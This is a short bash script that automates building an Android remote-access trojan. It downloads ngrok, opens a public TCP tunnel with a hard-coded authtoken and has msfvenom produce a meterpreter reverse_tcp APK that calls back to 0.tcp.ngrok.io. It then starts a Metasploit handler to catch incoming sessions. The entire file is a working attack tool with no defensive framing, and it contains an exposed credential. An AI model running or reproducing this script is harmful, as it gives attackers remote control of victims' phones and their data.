#!/bin/bash
mkdir RC
mkdir payload
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo apt install gnome-terminal
echo 'starting services'
service postgresql start
read -p 'choose for ngrok to start : ' lport
./ngrok authtoken 3TKGHN2vCqEzwEoRTNRFp_214CuTzXj7XZjTJVTdtp9
gnome-terminal -- ./ngrok tcp $lport
read -p 'port provided by ngrok : ' port
read -p 'payload name you want : ' pname
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LHOST=$port R> payload/$pname.apk
echo '$pname RAT saved in payload folder'
rm RC/hack.rc
touch RC/hack.rc
            echo use exploit/multi/handler > RC/hack.rc
            echo set PAYLOAD android/meterpreter/reverse_tcp >> RC/hack.rc
           
            echo set LHOST localhost >> RC/hack.rc
            
            echo set LPORT $lport >> RC/hack.rc
            echo set ExitOnSession false >> RC/hack.rc
            echo exploit -j -z >> RC/hack.rc
            cat RC/hack.rc
            xterm -e msfconsole -r RC/hack.rc
